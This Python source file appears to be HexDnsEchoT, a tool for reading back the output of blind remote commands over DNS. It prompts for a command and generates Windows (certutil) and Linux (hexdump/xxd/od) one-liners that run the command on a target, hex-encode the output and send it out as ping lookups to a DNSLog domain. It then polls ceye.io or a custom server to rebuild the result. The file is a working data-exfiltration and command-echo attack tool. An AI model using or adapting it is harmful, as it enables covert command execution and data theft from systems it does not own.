import argparse
import sys
import time
import random
import json
import binascii
import datetime
import pytz
import requests
import re
import operator
from tzlocal import get_localzone
from requests.auth import HTTPBasicAuth

# author: 617sec //https://github.com/Dr-S1x17
# author: sv3nbeast //https://github.com/sv3nbeast/DnslogCmdEcho
# author: A0WaQ4 //https://github.com/A0WaQ4/HexDnsEchoT

requestTime = 3 # DNSLog platform interval per request
commandHex = {}

def get_new_config():
    global domain,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce
    localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
    lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone="UTC") # record last finish time
    print(lastFinishTime)
    print("获取本次命令执行的结果:\npython3 HexDnsEchoT.py -d " + domain + " -t " + token + " -f " + filterdns + " -lt \"" + lastFinishTime + "\"" + " -m GR --force")
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    finishOnce = False

def get_ds_config():
    global time_zone,domain_server,count_counts,domain,dnsurl,token,command,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce,judgeDealData,getResult,skipLinesRe,tokens,lastFinishTimes,getGR
    url = domain_server + '/new_gen'
    if args.httpbasicuser == None:
        dataResult = json.loads(requests.get(url,verify=False).text)
    else:
        dataResult = json.loads(requests.get(url,verify=False,auth=HTTPBasicAuth(args.httpbasicuser, args.httpbasicpass)).text)
    domain = dataResult['domain']
    dnsurl = domain
    token = dataResult['token']
    tokens = token
    localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
    lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone=time_zone) # record last finish time
    lastFinishTimes = lastFinishTime
    print("\n获取本次命令执行结果:\npython3 HexDnsEchoT.py -ds " + domain_server + " -t " + token + " -lt \"" + lastFinishTime + "\" -m GR -cc " + str(count_counts) + " --force\n")
    print(domain_server + '/' +token)
    # dig.pm's timezone is utc，need to change timezone
    print(lastFinishTime)
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    finishOnce = False
    getResult = False
    getGR = True
    judgeDealData = "N"

def get_piece_config():
    global domain,token,command,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce,getResult,skipLinesRe,tokens,lastFinishTimes
    url = domain_server + '/new_gen'
    if args.httpbasicuser == None:
        dataResult = json.loads(requests.get(url,verify=False).text)
    else:
        dataResult = json.loads(requests.get(url,verify=False,auth=HTTPBasicAuth(args.httpbasicuser, args.httpbasicpass)).text)
    domain = dataResult['domain']
    token = dataResult['token']
    tokens = tokens + "," + token
    commandTemWin = r'for /f "skip=skipLines tokens=1-17" %a in (execfile7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.execfile.{0}'
    commandTemLinux = r'cat execfile7.txt | tail -n +skipLines |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
    commandWin = commandTemWin.format(domain)
    commandLinux = commandTemLinux.format(domain)
    execfilename = ''.join(re.findall(r'[A-Za-z]', command)) 
    print("Windows:\n")
    print(commandWin.replace('command',command).replace('execfile', execfilename).replace('skipLines',str(skipLinesRe)))
    print("\nLinux:\n")
    print(commandLinux.replace('command',command).replace('execfile', execfilename).replace('skipLines',str(skipLinesRe)))
    localTime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()) # get localtime
    lastFinishTime = timezone_change(localTime, src_timezone=str(get_localzone()), dst_timezone="Asia/Shanghai") # record last finish time
    lastFinishTimes = lastFinishTimes + "," + lastFinishTime
    print("\n获取本次命令执行结果:\npython3 HexDnsEchoT.py -ds " + domain_server +" -t " +  tokens + " -lt \"" + lastFinishTimes + "\" -m GR -cc " + str(count_counts) + " --force\n")
    print(domain_server+'/'+token)
    # dig.pm's timezone is utc，need to change timezone
    print(lastFinishTime)
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    getResult = False

def get_config():
    global time_zone,domain_server,count_counts,dnsurl,token,command,filterdns,lastFinishTime,commandStartPos,commandEndPos,lastRecordLen,finishOnce,skipLinesRe,getResult,getGR,firstGR,judgeDealData
    commandStartPos = 0
    commandEndPos = 0
    lastRecordLen = 0
    judgeDealData = "N"
    finishOnce = False
    firstGR = True
    getGR = False
    getResult = False


def generate_command(tool="hexdump"):
    commandTemWin = r'del execfile7 && del execfile7.txt && command > execfile7 &&echo 11111111111>>execfile7 && certutil -encodehex execfile7 execfile7.txt && for /f "tokens=1-17" %a in (execfile7.txt) do start /b ping -nc 1  %a%b%c%d%e%f%g%h%i%j%k%l%m%n%o%p%q.execfile.{0}'
    if tool == "od":
        commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|od -t x1 | sed "s/[[:space:]]//g" | cut -c 4-60| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
    elif tool == "xxd":
        commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|xxd > execfile7.txt && echo "00000051" >> execfile7.txt && cat execfile7.txt | cut -c 5-49 | sed "s/[[:space:]]//g" | sed "s/://g" | cut -d "|" -f1| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
    else:
        commandTemLinux = r'rm -f execfile7;rm -f execfile7.txt;command > execfile7 &&echo 11111111111 >>execfile7 && cat execfile7|hexdump -C > execfile7.txt && cat execfile7.txt |sed "s/[[:space:]]//g" | cut -d "|" -f1 | cut -c 5-55| while read line;do ping -c 1 -l 1 $line.execfile.{0}; done'
    commandWin = commandTemWin.format(dnsurl)
    commandLinux = commandTemLinux.format(dnsurl)
    execfilename = ''.join(re.findall(r'[A-Za-z]', command)) 
    print("Windows:\n")
    print(commandWin.replace('command',command).replace('execfile', execfilename))
    print("\nLinux:\n")
    print(commandLinux.replace('command',command).replace('execfile', execfilename))


def get_line(data: list):
    global skipLinesRe
    hexCommand = { item[:4] : item[4:] for item in data }
    linesNumber = [int(item[:3],base=16) for item in hexCommand]
    linesNumber = sorted(linesNumber,key = lambda x:x)
    lackLines = sorted(list(set(range(linesNumber[0], linesNumber[-1]+1)) - set(linesNumber)), reverse=True)
    hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
    first = int(hexCommand[0][0][:3],base = 16)
    last = int(hexCommand[-1][0][:3],base = 16)
    if skipLinesRe >= first:
        if len(lackLines) == 0:
            skipLinesRe = last
        else:
            skipLinesRe = lackLines.pop()
            print("\n发现中断，缺少第"+str(skipLinesRe)+"行的数据，下一次执行将从第"+str(skipLinesRe)+"行开始")
    else:
        print("\n发现中断，缺少第"+str(skipLinesRe)+"行至第"+str(first)+"行的数据，下一次执行将从第"+str(skipLinesRe)+"行开始")

def generate_code(code_len=4):
    all_charts = '0123456789abcdefghijklmnopqrstuvwxyz'
    last_pos = len(all_charts) -1
    code = ''
    for _ in range(code_len):
        index = random.randint(0,last_pos)
        code += all_charts[index]
    return code

def timezone_change(time_str, src_timezone, dst_timezone=None, time_format=None):
    """
    change timezone to utc timezone
    if dst_timezone is none, change time to localtime

    :param time_str:
    :param src_timezone: source timezone
    :param dst_timezone: target timezone; if equals none, change to localtime
    """
    if not time_format:
        time_format = "%Y-%m-%d %H:%M:%S"

    old_dt = datetime.datetime.strptime(time_str, time_format)

    dt = pytz.timezone(src_timezone).localize(old_dt)
    utc_dt = pytz.utc.normalize(dt.astimezone(pytz.utc))

    if dst_timezone:
        _timezone = pytz.timezone(dst_timezone)
        new_dt = _timezone.normalize(utc_dt.astimezone(_timezone))
    else:
        new_dt = utc_dt.astimezone()
    return new_dt.strftime(time_format)

# get DNSLog data 
def get_dnslogdata() -> list:
    if commandStartPos and commandEndFlag: 
        commandHex[commandName].extend([result[length-1]['name'] 
                                        for length in range(len(result),commandStartPos,-1) 
                                        if result[length-1]['name'].count('.') == 5])
                                        # Get the command part of the DNSLog data
        tempList = []
        for length in range(commandStartPos,-1,-1):
            if result[length-1]['created_at'] < lastFinishTime:break
            if result[length-1]['name'].count('.') == 5:
                tempList.append(result[length-1]['name']) 
        commandHex[commandName].extend(tempList)
        return commandHex[commandName]

# get DNSLog data 
def get_ds_dnslogdata() -> list:
    if commandStartPos and commandEndFlag: 
        commandHex[commandName].extend([result[length-1][1]['subdomain'] 
                                        for length in range(len(result),commandStartPos,-1) 
                                        if result[length-1][1]['subdomain'].count('.') == count_counts])
                                        # Get the command part of the DNSLog data
        tempList = []
        for length in range(commandStartPos,-1,-1):
            if result[length-1][1]['time'] < lastFinishTime:break
            if result[length-1][1]['subdomain'].count('.') == count_counts:
                if not result[length-1][1]['subdomain'].find("_") != -1:
                    tempList.append(result[length-1][1]['subdomain']) 
        commandHex[commandName].extend(tempList)
        return commandHex[commandName]

# deal with DNSlog data, Format the output
def deal_data(data: list):
    global finishOnce
    if commandStartPos and commandEndFlag:
        try:
            hexCommand = { item[:4] : item[4:] for item in data }

            hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))
            
            hexCommand = [ item[1][:32] for item in hexCommand]
            
        except:
            print('!!!!Error Command format! Try to find DNSLog site(dnslog) to get conntent..')
            pass
        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1])
        commandResult = ''.join(hexCommand)
        # print(commandResult)
        try:
            commandResult = commandResult.split("0a3131")
            commandResult = commandResult[0] #兼容linux命令
        except:
            pass
        print('\n----Command Result----')
        Head = '\033[36m'
        End = '\033[0m'
        try:
            try:#gb2312解码
                print(Head + binascii.a2b_hex(commandResult).decode('gb2312') + End)
            except UnicodeDecodeError:#utf-8解码 linux存在中文字符需要这个解码
                print(Head + binascii.a2b_hex(commandResult).decode('utf-8') + End)
        except:
            print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
        print('----Get Result End!----')
        finishOnce = True

# deal with DNSlog data, Format the output
def deal_ds_data(data: list):
    global finishOnce,getGR
    if commandStartPos and commandEndFlag:
        try:
            hexCommand = { item[:4] : item[4:] for item in data } 
            hexCommand = sorted(hexCommand.items(), key=lambda x: int(x[0], 16))

            hexCommand = [ item[1][:32] for item in hexCommand]
        except:
            print('!!!!Error Command format! Try to find DNSLog site(dnslog) to get conntent..')
            pass
        hexCommand[-1] = ''.join(hexCommand[-1].split('0d0a')[:-1])
        commandResult = ''.join(hexCommand)
        # print(commandResult)
        try:
            commandResult = commandResult.split("0a3131")
            commandResult = commandResult[0] #兼容linux命令
        except:
            pass
        print('\n----Command Result----')
        Head = '\033[36m'
        End = '\033[0m'
        try:
            try:#gb2312解码
                print(Head + binascii.a2b_hex(commandResult).decode('gb2312') + End)
            except UnicodeDecodeError:#utf-8解码 linux存在中文字符需要这个解码
                print(Head + binascii.a2b_hex(commandResult).decode('utf-8') + End)
        except:
            print('Maybe use START to execute commands and cause DNSLog records to be lost..\nIt is recommended to remove START from the command')
        print('----Get Result End!----')
        finishOnce = True
        getGR = True

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', "--dnsurl", help = "ceye dnslog")
    parser.add_argument('-t', "--token", help = "ceye token")
    parser.add_argument('-lt', "--lastfinishtime", help = "the lastfinisgtime")
    parser.add_argument('-f', "--filter", help = "dns filter")
    parser.add_argument('-ds', "--domain_server", help = "domain server")
    parser.add_argument('-tz', "--timezone", help = "timezone")
    parser.add_argument('-cc', "--count", help = "count counts")
    parser.add_argument('-m', "--model", help = "recent result", default = "result")
    parser.add_argument('-u', "--httpbasicuser", help="HTTPBasicAuth User")
    parser.add_argument('-p', "--httpbasicpass", help="HTTPBasicAuth Pass")
    parser.add_argument('-l', "--linuxhex", help="Linux HEX tool")
    parser.add_argument("--force", action="store_true" , help = "force deal_ds_data")
    args = parser.parse_args()
    if args.linuxhex == "od":
        tool="od"
    elif args.linuxhex == "xxd":
        tool="xxd"
    else:
        tool="hexdump"
    if args.domain_server == None:
        if args.model == "GR":
            if args.dnsurl == None:
                print("without ceyedns!")
                sys.exit(0)
            if args.token == None:
                print("without ceyetoken!")
                sys.exit(0)
            if args.lastfinishtime == None:
                print("without lastfinishtime!")
                sys.exit(0)
            lastFinishTime = args.lastfinishtime
            get_config()
            domain = args.dnsurl
            filterdns = args.filter
            dnsurl =args.filter + "." + args.dnsurl
            print(dnsurl)
            token = args.token
            print(token)
        else:
            if args.dnsurl == None:
                print("without ceyedns!")
                sys.exit(0)
            if args.token == None:
                print("without ceyetoken!")
                sys.exit(0)
            filterdns = generate_code(8)
            domain = args.dnsurl
            dnsurl = filterdns + "." +args.dnsurl
            print(dnsurl)
            token = args.token
            print(token)
            command = input("请输入想要执行的命令:")
            get_new_config()
            generate_command(tool)
    else:
        if args.model == "GR":
            if args.token == None:
                print("without token!")
                sys.exit(0)
            if args.lastfinishtime == None:
                print("without lastfinishtime!")
                sys.exit(0)
            if args.count == None:
                print("without count")
                sys.exit(0)
            count_counts = args.count
            count_counts = int(count_counts)
            lastFinishTimes = args.lastfinishtime
            tokens = args.token
            domain_server = args.domain_server
            dataList = []
            skipLinesRe = 0
            get_config()
        else:
            if args.timezone == None:
                print("without timezone")
                sys.exit(0)
            if args.count == None:
                print("without count")
                sys.exit(0)
            command = input("请输入想要执行的命令:")
            domain_server = args.domain_server
            count_counts = args.count
            count_counts = int(count_counts)
            time_zone = args.timezone
            dataList = []
            skipLinesRe = 0
            get_ds_config()
            generate_command(tool)

    while True:
        if finishOnce:
            if args.domain_server == None:
                get_new_config()
                filterdns = generate_code(8)
                dnsurl = filterdns + "." +args.dnsurl
                print(dnsurl)
                token = args.token
                print(token)
                command = input("请输入想要执行的命令:")
                generate_command(tool)
            else:
                dataList = []
                skipLinesRe = 0
                command = input("请输入想要执行的命令：")
                get_ds_config()
                generate_command(tool)

        if not args.domain_server == None:
            if getResult and getGR:
                get_piece_config()
            if not getGR and firstGR:
                if operator.contains(tokens,","):
                    tokensList = tokens.split(",")
                    lastFinishTimesList = lastFinishTimes.split(",")
                    tokenLen = len(tokensList)
                    l = 0
                    token = tokensList[l]
                    lastFinishTime = lastFinishTimesList[l]
                else:
                    token = tokens
                    lastFinishTime = lastFinishTimes
            if not getGR and not firstGR:
                if getResult:
                    commandStartPos = 0
                    commandEndPos = 0
                    lastRecordLen = 0
                    getResult = False
                token = tokensList[l]
                lastFinishTime = lastFinishTimesList[l]

        for i in range(requestTime,-1,-1):
            print('\r', 'Wait DNSLog data: {}s...'.format(str(i)), end='') 
            time.sleep(1)
        try:
            if args.domain_server == None:
                url = "http://api.ceye.io/v1/records?token=" + token + "&type=dns&filter=" + filterdns
            else:
                url = domain_server + '/' +token
            #proxies = { 'http':'http://127.0.0.1:8080' }
            if args.httpbasicuser == None:
                responsestxt = requests.get(url, proxies=False, verify=False).text.lower()
                result = json.loads(responsestxt)
            else:
                responsestxt = requests.get(url, proxies=False, verify=False,auth=HTTPBasicAuth(args.httpbasicuser, args.httpbasicpass)).text.lower()
                result = json.loads(responsestxt)
            if args.domain_server == None:
                result = result['data']
                if result == []:
                    result = NULL
                result = sorted(result, key=lambda x: int(x['id']))
            else:
                result = sorted(result.items(), key=lambda x: int(x[0]))
        except:
            print('\r', 'Not Find DNSLog Result!', end='')
            continue

        commandStartFlag = 1 if lastRecordLen == len(result) else 0
        lastRecordLen = len(result)
        commandEndFlag = 1 if commandEndPos == len(result) else 0 
        commandEndPos = len(result)
        
        if args.domain_server == None:
            if not commandStartPos and ((result[-1]['name'].count('.'))  == 5 or 
                                        commandStartFlag): 
                                        # judge if the DNSLog recording is start
                if result[-1]['created_at'] < lastFinishTime: 
                    print('\r', 'Not Find DNSLog Result!', end='')
                    continue                     
                commandStartPos = len(result)
                commandName = result[-1]['name'].split('.')[1]
                print('\nFind Command Record!...')
                print('----Command: \033[36m{}\033[0m----'.format(commandName))
                commandHex[commandName] = [] 
                print('Wait Command DNSLog Record Finish...')   
            if commandStartPos and ((result[-1]['name'].count('.')) != 5 or 
                                    commandEndFlag):
                                    # judge if the DNSLog recording is over
                commandEndFlag = 1
                #print('Command DNSLog Record Finish...')   

            dataList = get_dnslogdata()
            deal_data(dataList)
        else:
            if not commandStartPos and ((result[-1][1]['subdomain'].count('.'))  == count_counts or 
                                        commandStartFlag): 
                                        # judge if the DNSLog recording is start
                if result[-1][1]['time'] < lastFinishTime: 
                    print('\r', 'Not Find DNSLog Result!', end='')
                    continue                     
                commandStartPos = len(result)
                commandName = result[-1][1]['subdomain'].split('.')[1]
                print('\nFind Command Record!...')
                print('----Command: \033[36m{}\033[0m----'.format(commandName))
                commandHex[commandName] = [] 
                print('Wait Command DNSLog Record Finish...')   
            if commandStartPos and ((result[-1][1]['subdomain'].count('.')) != count_counts or 
                                    commandEndFlag):
                                    # judge if the DNSLog recording is over
                commandEndFlag = 1
                #print('Command DNSLog Record Finish...')   

            # dataList = get_ds_dnslogdata()
            dataDns = get_ds_dnslogdata()
            if not dataDns == None:
                dataList.extend(dataDns)
                firstGR = False
            
            if not dataDns == None:
                getResult = True
                if operator.contains(responsestxt,"31313131") or operator.contains(responsestxt,"0a31"):
                    get_line(dataList)
                    if not args.force:
                        judgeDealData = input("\n疑似为最后一块，请输入Y/N决定是否开始处理数据：").lower()
                else:
                    get_line(dataDns)
                    # print("本次获取到的数据为"+len(result)+"行")
                    if not args.force:
                        print("\n未发现结束符号，继续执行")
            
            if judgeDealData == "y":
                deal_ds_data(dataList)
            else:
                if args.force:
                    if operator.contains(args.token,","):
                        if l == len(tokensList) - 1:
                            deal_data(dataList)
                        else:
                            l =l + 1
                    else:
                        deal_data(dataList)
                elif not dataDns == None and not getGR:
                    l = l + 1
                    # print(l)
